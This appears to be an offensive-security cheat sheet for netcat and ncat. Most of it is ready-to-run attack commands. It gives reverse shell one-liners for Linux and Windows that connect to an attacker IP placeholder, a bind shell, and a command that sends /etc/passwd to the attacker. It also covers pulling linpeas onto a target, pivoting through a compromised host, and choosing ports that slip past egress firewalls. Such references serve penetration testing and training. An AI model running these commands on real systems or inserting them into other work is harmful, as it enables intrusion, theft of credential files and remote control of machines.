# 🛠️ Netcat (nc / ncat)

> **Category:** Networking Swiss Army Knife
> **When to Use:** Reverse shells, file transfers, port scanning, banner grabbing, pivoting.

---

## 📋 Core Flags

| Flag | Description |
|------|-------------|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p` | Specify port |
| `-k` | Keep listening after disconnect |
| `-w <sec>` | Timeout |
| `-z` | Zero-I/O (port scanning) |
| `-u` | UDP mode |
| `-e` | Execute program on connect (not always available) |
| `-c` | Execute shell command on connect |

---

## 🐚 Reverse Shells

### Listener (on your machine)
```bash
nc -lvnp 4444
# or with rlwrap for arrow key support:
rlwrap nc -lvnp 4444
```

### Connecting Back (on target)

```bash
# Basic reverse shell
nc <attacker_ip> 4444 -e /bin/bash

# If -e not available (OpenBSD netcat)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f

# Windows
nc.exe <attacker_ip> 4444 -e cmd.exe
```

### Bind Shell (target listens)
```bash
# On target (opens a port)
nc -lvnp 4444 -e /bin/bash

# On attacker (connects to target)
nc <target_ip> 4444
```

---

## 📂 File Transfer

### Method 1: Receiver listens
```bash
# Receiver (attacker)
nc -lvnp 4444 > received_file

# Sender (target)
nc <attacker_ip> 4444 < /etc/passwd
```

### Method 2: Sender listens
```bash
# Sender (attacker hosting file)
nc -lvnp 4444 < linpeas.sh

# Receiver (target downloads)
nc <attacker_ip> 4444 > linpeas.sh
```

### Transfer with progress confirmation
```bash
# Sender
nc -lvnp 4444 < file.zip && echo "Transfer complete"

# Receiver
nc <ip> 4444 > file.zip
```

---

## 🔍 Port Scanning

```bash
# TCP port scan (range)
nc -znv <target> 20-100

# Specific ports
nc -znv <target> 22 80 443 445 3389

# UDP scan
nc -znvu <target> 53 161 162
```

---

## 🏷️ Banner Grabbing

```bash
# Generic banner grab
echo "" | nc -vn <target> <port>

# HTTP banner
echo "HEAD / HTTP/1.1\r\nHost: target\r\n\r\n" | nc <target> 80

# SMTP banner
nc -vn <target> 25

# FTP banner
nc -vn <target> 21
```

---

## 🔄 Relaying & Pivoting

### Simple Relay (bidirectional pipe)
```bash
# Create a relay through compromised host
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | nc <internal_target> 80 > /tmp/f
```

### Port Forwarding with ncat (Nmap's netcat)
```bash
# Forward local port 8080 to internal target port 80
ncat -lvnp 8080 --sh-exec "ncat <internal_ip> 80"
```

---

## 💬 Simple Chat / Data Exfil

```bash
# Machine A (listener)
nc -lvnp 4444

# Machine B (connect and type)
nc <machine_a_ip> 4444
# Now anything typed on either side appears on the other
```

---

## 💡 Expert Tips

| Tip | Details |
|-----|---------|
| Port selection | Use 443, 80, 53 — rarely blocked by egress firewalls |
| rlwrap | `rlwrap nc -lvnp 4444` gives you arrow keys and history |
| Persistence | Use `-k` flag to keep listener open for multiple connections |
| Ncat vs nc | Ncat (from Nmap) supports SSL: `ncat --ssl -lvnp 4444` |
| Timeout | Add `-w 3` to auto-close dead connections |

---

## ⚠️ Variants

| Version | Notes |
|---------|-------|
| GNU netcat | Has `-e` flag (execute) |
| OpenBSD netcat | No `-e`, use mkfifo method |
| Ncat (Nmap) | SSL support, access control, best features |
| Windows nc.exe | Available in Kali's windows-binaries |

---

## 🔗 Links

- After catching shell → stabilize with Python PTY upgrade
- Alternative: socat (more powerful), pwncat (auto-upgrade)
- Combine with: rlwrap (better shell experience)
